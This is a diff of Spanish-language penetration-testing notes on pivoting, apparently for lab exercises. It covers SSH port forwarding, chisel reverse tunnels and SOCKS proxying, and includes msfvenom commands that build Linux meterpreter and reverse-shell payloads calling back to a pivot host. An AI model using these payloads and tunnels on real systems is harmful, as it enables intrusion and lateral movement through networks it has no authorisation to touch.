@@ -7,7 +7,7 @@ NOTA: Si hemos accedido a través de una `revshell` simple a la máquina sobre l
 Es útil para acceder a servicios locales en una máquina remota como si estuvieran en nuestra máquina local. En este caso `$target` debe tener un servidor ssh. Supongamos que queremos conectarnos a MySQL desde `$pwnbox` a un servidor MySQL que solo acepta conexiones locales
 - Hacemos que nuestra `$pwnbox` esté en escucha en el puerto `1234` y redirija el tráfico al puerto 3306 de `$target`. Desde `$pwnbox` : 
 	```bash
-	ssh -NfL 1234:localhost:3306 username@$target
+	ssh -NfL 1234:localhost:3306 $username@$target
 	```
 - Desde `$pwnbox`  escribimos
 ```bash
@@ -62,7 +62,7 @@ Tenemos aceso a `$pivot` y no tenemos acceso a `$target` desde nuestra pwnbox, p
 	#Ejemplo meterpreter linux:
 	 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=$pivot -f elf -o revshell.exe LPORT=44444
 	# Ejemplo revshell para nc en linux:
-	msfvenom -p linux/x64/shell_reverse_tcp lhost=$pivot -f elf -o revshell.exe LPORT=4444
+	msfvenom -p linux/x64/shell_reverse_tcp lhost=$pivot -f elf -o revshell.exe LPORT=44444
 	```
 - Nos ponemos en escucha en `$pwnbox`
 	```bash
@@ -388,12 +388,22 @@ Se ejecuta en la `pwnbox`
 Ejecutar este comando en la máquina pivote redirigiría el puerto `8001` de nuestra máquina (`localhost`) al puerto `80` de `172.16.5.1`
 ```bash
 ./chisel client 10.10.14.114:8000 R:8001:172.16.5.1:80 -v 
+# Significado: 
+R:<listen_host>:<listen_port>:<target_host>:<target_port>
 ```
 Puede ser un poco más seguro para nosotros como atacantes escribir:
 ```bash
 ./chisel client 10.10.14.114:8000 R:127.0.0.1:8001:172.16.5.1:80 -v 
 ```
 ya que sólo expondría el puerto 8001 en localhost
+##### Comportamiento `R:::` en otros escenarios
+
+|**Comando**|**Resultado**|
+|---|---|
+|`R:8080:127.0.0.1:80`|El atacante escucha en **8080** y reenvía tráfico al **puerto 80 en la víctima**.|
+|`R::8080:127.0.0.1:80`|**El atacante escucha en todas las interfaces (`0.0.0.0:8080`)** y reenvía a **80 en la víctima**.|
+|`R:::80`|**Igual que arriba, pero el puerto atacante también es 80**.|
+|`R::::3306`|**El atacante escucha en `3306` y reenvía a `127.0.0.1:3306` en la víctima**.|
 #### Redirección socks
 El siguiente comando hace que el servidor esté escuchando en el puerto `1080`
 ```bash
@@ -403,6 +413,25 @@ por lo que habría que añadir a `/etc/proychains.conf`
 ```
 socks5 127.0.0.1 1080
 ```
+### Versión a elegir de chisel
+#### Linux
+
+| Salida de `uname -m` | Arquitectura                | Archivo Chisel                        |
+|----------------------|---------------------------|--------------------------------------|
+| x86_64             | Linux 64-bit (AMD/Intel)   | chisel_1.10.0_linux_amd64.gz       |
+| i686               | Linux 32-bit (AMD/Intel)   | chisel_1.10.0_linux_386.gz         |
+| i386               | Linux 32-bit (AMD/Intel)   | chisel_1.10.0_linux_386.gz         |
+| armv7l             | Linux ARM 32-bit           | chisel_1.10.0_linux_arm.gz         |
+| aarch64            | Linux ARM 64-bit           | chisel_1.10.0_linux_arm64.gz       |
+| arm64              | Linux ARM 64-bit           | chisel_1.10.0_linux_arm64.gz       |
+| mips               | Linux MIPS                 | chisel_1.10.0_linux_mips.gz        |
+#### Windows
+| Versión de Windows | Comando para verificar       | Archivo Chisel                 |
+| ------------------ | ---------------------------- | ------------------------------ |
+| Windows 64-bit     | `wmic os get osarchitecture` | chisel_1.10.0_windows_amd64.gz |
+| Windows 32-bit     | `wmic os get osarchitecture` | chisel_1.10.0_windows_386.gz   |
+
+
 ---
 ## Dato curioso
 Para conectarme a una máquina `$target` a través de una máquina `$pivot` sí puedo con `ssh -D` , pero no con `ssh -L` . Explicación: 
